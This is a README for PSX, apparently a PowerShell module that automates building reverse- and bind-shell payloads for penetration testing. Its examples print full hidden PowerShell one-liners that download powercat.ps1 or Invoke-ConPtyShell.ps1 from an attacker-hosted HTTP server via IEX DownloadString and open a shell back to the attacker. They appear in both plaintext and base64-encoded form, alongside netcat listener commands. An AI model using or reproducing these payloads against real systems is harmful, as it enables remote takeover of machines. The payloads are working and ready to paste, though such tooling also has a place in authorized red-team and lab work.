# PSX

## Description
This module helps specifically with PowerShell payloads

You no longer need to manually base64-encode your payloads, host, or tweak them\
With a few quick functions, you can now automate the whole shebang with only a few arguments

## Features
PSX currently provides the following features:
- Base64-(encode|decode) payloads
- PowerCat automation
- ConPtyShell automation (including terminal [auto]size specification)
- Python Simple HTTP server
- Payload to clipboard

## Available Functions
- `cvsh` -> `Convert-Shell`
- `ib64` -> `Invoke-B64`
- `Invoke-Server`
- `Get-InterfaceAddress`

## Cloning
```sh
kali@kali:~$ git clone https://github.com/X0RW3LL/PSX.git /home/$USER/.local/share/powershell/Modules/PSX
```
## Getting help
```ps
PS kali@kali /home/kali> Get-Help Convert-Shell -Full
```
## Examples

### PowerCat (reverse powershell)
```ps
PS kali@kali /home/kali> cvsh -i wlan1 -t powercat -lp 443 -s

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.111:80/powercat.ps1');powercat -c 192.168.0.111 -p 443 -e powershell"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADEAMQA6ADgAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgAwAC4AMQAxADEAIAAtAHAAIAA0ADQAMwAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA


[!] Starting HTTP server on wlan1 port 80
[!] Currently serving: /usr/share/powershell-empire/empire/server/data/module_source/management
[!] Ctrl+C terminates the server

WARNING: Do not forget to start a netcat listener on port 443

$ nc -lnvp 443

Serving HTTP on 192.168.0.111 port 80 (http://192.168.0.111:80/) ...
```
### PowerCat (bind cmd)
```ps
PS kali@kali /home/kali> cvsh -t powercat -lp 4444 -s -i docker0 -e cmd -b

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:80/powercat.ps1');powercat -l -p 4444 -e cmd"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADcALgAwAC4AMQA6ADgAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AbAAgAC0AcAAgADQANAA0ADQAIAAtAGUAIABjAG0AZAA=


[!] Starting HTTP server on docker0 port 80
[!] Currently serving: /usr/share/powershell-empire/empire/server/data/module_source/management
[!] Ctrl+C terminates the server

Serving HTTP on 172.17.0.1 port 80 (http://172.17.0.1:80/) ...
```
### ConPty (split terminal autosize)
```ps
PS kali@kali /home/kali> cvsh -t conpty -lp 4455 -s -sp 8080 -i wg0

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:8080/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 4455 -Rows 49 -Cols 95"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADAALgAyADoAOAAwADgAMAAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwAIAAxADAALgA4AC4AMAAuADIAIAA0ADQANQA1ACAALQBSAG8AdwBzACAANAA5ACAALQBDAG8AbABzACAAOQA1AA==


[!] Starting HTTP server on wg0 port 8080
[!] Currently serving: /home/x0rw3ll/.local/share/powershell/Modules/PSX/extensions
[!] Ctrl+C terminates the server

WARNING: Do not forget to start a netcat listener on port 4455

$ nc -lnvp 4455 -c 'stty raw -echo; fg; reset'

Serving HTTP on 10.8.0.2 port 8080 (http://10.8.0.2:8080/) ...
```
### ConPty (fullscreen terminal explicit sizing)
```ps
PS kali@kali /home/kali> cvsh -t conpty -lp 445 -s -i wg0 -rows 51 -cols 191          

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:80/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 445 -Rows 51 -Cols 191"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADAALgAyADoAOAAwAC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAnACkAOwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgADEAMAAuADgALgAwAC4AMgAgADQANAA1ACAALQBSAG8AdwBzACAANQAxACAALQBDAG8AbABzACAAMQA5ADEA


[!] Starting HTTP server on wg0 port 80
[!] Currently serving: /home/x0rw3ll/.local/share/powershell/Modules/PSX/extensions
[!] Ctrl+C terminates the server

WARNING: Do not forget to start a netcat listener on port 445

$ nc -lnvp 445 -c 'stty raw -echo; fg; reset'

Serving HTTP on 10.8.0.2 port 80 (http://10.8.0.2:80/) ...
```
### Base64-decode
```ps
PS kali@kali /home/kali> ib64 -d SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADEAMQA6ADgAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgAwAC4AMQAxADEAIAAtAHAAIAA0ADQAMwAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA

[+] Decoded payload:
--------------------
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.111:80/powercat.ps1');powercat -c 192.168.0.111 -p 443 -e powershell

```
